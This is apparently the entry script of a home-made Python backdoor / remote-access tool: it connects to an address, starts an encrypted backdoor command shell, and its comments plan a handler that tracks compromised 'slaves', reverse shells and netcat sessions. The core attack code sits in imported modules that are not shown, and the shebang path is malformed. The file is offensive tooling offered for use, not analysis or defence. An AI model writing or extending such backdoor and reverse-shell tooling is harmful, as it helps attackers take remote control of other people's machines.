#!/bin/usr/python3

from lib.connection import Connection
from lib.cli import CLI
from lib.backdoor import Backdoor
from lib.crypto import Crypto

def main():
    cli = CLI()
    crypto = Crypto()
    
    # create thead_pool and for each tread run connection to wait for connection
    # store cons and addrs arrays
    # slaves[(conn, (ip_addr, port))]
    # job1 is backdoor interface including revshell, job 2 keeps connections
    # when job1 finishes try to grab another connection and give it to user, in case of revshell on quit netcat
    # revshell should put connection back to cons lists and go back to main menu and wait to exit netcat
    # need main menu to list connections, connect to client and exit
    # exit shell shout put connection back to cons list and go back to main menu

    connection = Connection(cli.ip_addr, cli.port)
    conn = connection.connect()

    backdoor = Backdoor(connection.conn, cli.ip_addr, cli.port, cli.shell_port, crypto)
    backdoor.cmd_shell()

    return 0
    

if __name__ == "__main__":
    main()
